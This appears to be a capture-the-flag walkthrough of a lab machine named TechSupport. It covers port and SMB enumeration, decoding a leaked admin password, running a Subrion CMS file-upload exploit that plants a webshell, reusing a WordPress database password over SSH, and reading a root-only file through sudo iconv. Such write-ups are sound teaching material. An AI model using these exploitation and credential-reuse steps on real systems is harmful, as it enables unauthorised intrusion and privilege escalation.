# IP
10.10.41.86

## Enumeration
### Nmap
- Found 4 ports running on the machine.

```console
❯ nmap -sC -sV 10.10.41.86 -p- -vvv --min-rate=700 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-07 09:34 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:34
Completed NSE at 09:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:34
Completed NSE at 09:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:34
Completed NSE at 09:34, 0.00s elapsed
Initiating Ping Scan at 09:34
Scanning 10.10.41.86 [2 ports]
Completed Ping Scan at 09:34, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:34
Completed Parallel DNS resolution of 1 host. at 09:34, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 09:34
Scanning 10.10.41.86 [65535 ports]
Discovered open port 22/tcp on 10.10.41.86
Discovered open port 139/tcp on 10.10.41.86
Discovered open port 445/tcp on 10.10.41.86
Discovered open port 80/tcp on 10.10.41.86
Increasing send delay for 10.10.41.86 from 0 to 5 due to max_successful_tryno increase to 4
Connect Scan Timing: About 29.07% done; ETC: 09:36 (0:01:16 remaining)
Connect Scan Timing: About 60.38% done; ETC: 09:36 (0:00:40 remaining)
Completed Connect Scan at 09:36, 98.32s elapsed (65535 total ports)
Initiating Service scan at 09:36
Scanning 4 services on 10.10.41.86
Completed Service scan at 09:36, 11.48s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.41.86.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:36
Completed NSE at 09:36, 7.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:36
Completed NSE at 09:36, 0.61s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:36
Completed NSE at 09:36, 0.00s elapsed
Nmap scan report for 10.10.41.86
Host is up, received conn-refused (0.15s latency).
Scanned at 2022-11-07 09:34:21 IST for 118s
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtST3F95eem6k4V02TcUi7/Qtn3WvJGNfqpbE+7EVuN2etoFpihgP5LFK2i/EDbeIAiEPALjtKy3gFMEJ5QDCkglBYt3gUbYv29TQBdx+LZQ8Kjry7W+KCKXhkKJEVnkT5cN6lYZIGAkIAVXacZ/YxWjj+ruSAx07fnNLMkqsMR9VA+8w0L2BsXhzYAwCdWrfRf8CE1UEdJy6WIxRsxIYOk25o9R44KXOWT2F8pP2tFbNcvUMlUY6jGHmXgrIEwDiBHuwd3uG5cVVmxJCCSY6Ygr9Aa12nXmUE5QJE9lisYIPUn9IjbRFb2d2hZE2jQHq3WCGdAls2Bwnn7Rgc7J09
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBClT+wif/EERxNcaeTiny8IrQ5Qn6uEM7QxRlouee7KWHrHXomCB/Bq4gJ95Lx5sRPQJhGOZMLZyQaKPTIaILNQ=
|   256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDolvqv0mvkrpBMhzpvuXHjJlRv/vpYhMabXxhkBxOwz
80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-11-07T04:06:15
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2022-11-07T09:36:15+05:30
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 20255/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 61679/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 29158/udp): CLEAN (Timeout)
|   Check 4 (port 27071/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -1h49m57s, deviation: 3h10m30s, median: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:36
Completed NSE at 09:36, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:36
Completed NSE at 09:36, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:36
Completed NSE at 09:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.62 seconds
```

## Samba(enum4linux)
- Found a share `websvr` which we can access without password.

```console
❯ enum4linux -a -u "" -p "" 10.10.41.86 | tee enum4linux.log
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Nov  7 09:38:42 2022

 =========================================( Target Information )=========================================

Target ........... 10.10.41.86
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.41.86 )============================


[E] Can't find workgroup/domain



 ================================( Nbtstat Information for 10.10.41.86 )================================

Looking up status of 10.10.41.86
No reply from 10.10.41.86

 ====================================( Session Check on 10.10.41.86 )====================================


[+] Server 10.10.41.86 allows sessions using username '', password ''


 =================================( Getting domain SID for 10.10.41.86 )=================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ===================================( OS information on 10.10.41.86 )===================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.41.86 from srvinfo:
	TECHSUPPORT    Wk Sv PrQ Unx NT SNT TechSupport server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03


 ========================================( Users on 10.10.41.86 )========================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 ==================================( Share Enumeration on 10.10.41.86 )==================================


	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	websvr          Disk
	IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP

[+] Attempting to map shares on 10.10.41.86

//10.10.41.86/print$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.41.86/websvr	Mapping: OK Listing: OK Writing: N/A
```

### Gobuster(/)
- Found three 2 useful endpoints, `wordpress` and `test`

```console
❯ gobuster dir --url http://10.10.41.86/ -w /usr/share/dirb/wordlists/common.txt -x js,php,txt,html | tee gobuster_web.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.41.86/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html,js
[+] Timeout:                 10s
===============================================================
2022/11/07 09:37:15 Starting gobuster in directory enumeration mode
===============================================================
/.hta.php             (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.hta.js              (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htaccess.js         (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.js         (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 11321]
/index.html           (Status: 200) [Size: 11321]
/phpinfo.php          (Status: 200) [Size: 94925]
/phpinfo.php          (Status: 200) [Size: 94925]
/server-status        (Status: 403) [Size: 276]
/test                 (Status: 301) [Size: 309] [--> http://10.10.41.86/test/]
/wordpress            (Status: 301) [Size: 314] [--> http://10.10.41.86/wordpress/]
```
### Gobuster(/test)
- Didn't find anything interesting.

```console
❯ gobuster dir --url http://10.10.41.86/test -w /usr/share/dirb/wordlists/common.txt -x js,php,txt,html | tee gobuster_web_test.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.41.86/test
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,js,php
[+] Timeout:                 10s
===============================================================
2022/11/07 10:00:25 Starting gobuster in directory enumeration mode
===============================================================
/.hta.js              (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.htaccess.js         (Status: 403) [Size: 276]
/.htpasswd.js         (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 20677]
/index.html           (Status: 200) [Size: 20677]
/index_1.html         (Status: 200) [Size: 365]
/index_2.html         (Status: 200) [Size: 365]

===============================================================
2022/11/07 10:06:13 Finished
===============================================================
```

### Subrion(/subrion/panel)
- When we look at the `enter.txt`, I found that there there was a `/panel` in `/subrion`.
- Got a login panel.
- Logged in
- I tried uploading some shell didn't work fine for me
- So, I found an exploit on [exploit-db](https://www.exploit-db.com/exploits/50737) for subrion


## Exploitation
### Samba(/websrv)
- Found a file named `enter.txt`

```console
❯ smbclient  \\\\10.10.41.86\\websvr -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 12:47:38 2021
  ..                                  D        0  Sat May 29 12:33:47 2021
  enter.txt                           N      273  Sat May 29 12:47:38 2021

		8460484 blocks of size 1024. 5697204 blocks available
smb: \> ls -a
NT_STATUS_NO_SUCH_FILE listing \-a
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> exit
❯ cat enter.txt
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
```

- On cracking password with `cyberChef`, found it as `Scam2021`.
- But we still don't know the endpoint to use as password. 

### Subrion
- Downloaded the exploit and ran it 

```console
❯ python3 exploit.py -u http://10.10.41.86/subrion/panel/  -l admin -p Scam2021
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422

[+] Trying to connect to: http://10.10.41.86/subrion/panel/
[+] Success!
[+] Got CSRF token: KKdJ7qEe4N2H0r3o0gGpdcisr3wR73NTk2Th2G5C
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: mifskxcmzolcoqn

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.10.41.86/subrion/panel/uploads/mifskxcmzolcoqn.phar

$ whoami
www-data
```

### Privilege Escalation
- Found password for wordpress in `/var/www/html/wordpress/wp-config.html`

```console
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/wordpress/' );
}

define('WP_HOME', '/wordpress/index.php');
define('WP_SITEURL', '/wordpress/');

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```
- There is a user called `scamsite`

```console
❯ ssh scamsite@10.10.41.86
The authenticity of host '10.10.41.86 (10.10.41.86)' can't be established.
ED25519 key fingerprint is SHA256:J/HR9GKX4ReRvs4I9fnMwmJrOTL5B3skZ4owxwxWoyM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.41.86' (ED25519) to the list of known hosts.
scamsite@10.10.41.86's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


120 packages can be updated.
88 updates are security updates.


Last login: Fri May 28 23:30:20 2021
scamsite@TechSupport:~$
```

- Found root flag

```console
❯ ssh scamsite@10.10.41.86
The authenticity of host '10.10.41.86 (10.10.41.86)' can't be established.
ED25519 key fingerprint is SHA256:J/HR9GKX4ReRvs4I9fnMwmJrOTL5B3skZ4owxwxWoyM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.41.86' (ED25519) to the list of known hosts.
scamsite@10.10.41.86's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


120 packages can be updated.
88 updates are security updates.


Last login: Fri May 28 23:30:20 2021
scamsite@TechSupport:~$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
scamsite@TechSupport:~$ ls /root
ls: cannot open directory '/root': Permission denied
scamsite@TechSupport:~$ iconv -f 8859_1 -t 8859_1 "/root/root.txt"
iconv: cannot open input file `/root/root.txt': Permission denied
scamsite@TechSupport:~$ sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
851b8233a8c09400ec30651bd1529bf1ed02790b  -
```
